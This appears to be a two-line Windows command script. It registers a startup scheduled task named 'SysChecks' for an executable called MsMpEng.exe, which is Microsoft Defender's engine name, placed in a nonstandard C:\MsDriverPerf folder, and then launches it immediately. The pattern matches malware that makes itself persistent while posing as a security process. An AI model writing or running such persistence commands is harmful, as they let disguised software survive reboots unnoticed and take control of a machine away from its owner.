schtasks /create /tn "SysChecks" /tr c:\MsDriverPerf\MsMpEng.exe /sc onstart
start C:\MsDriverPerf\MsMpEng.exe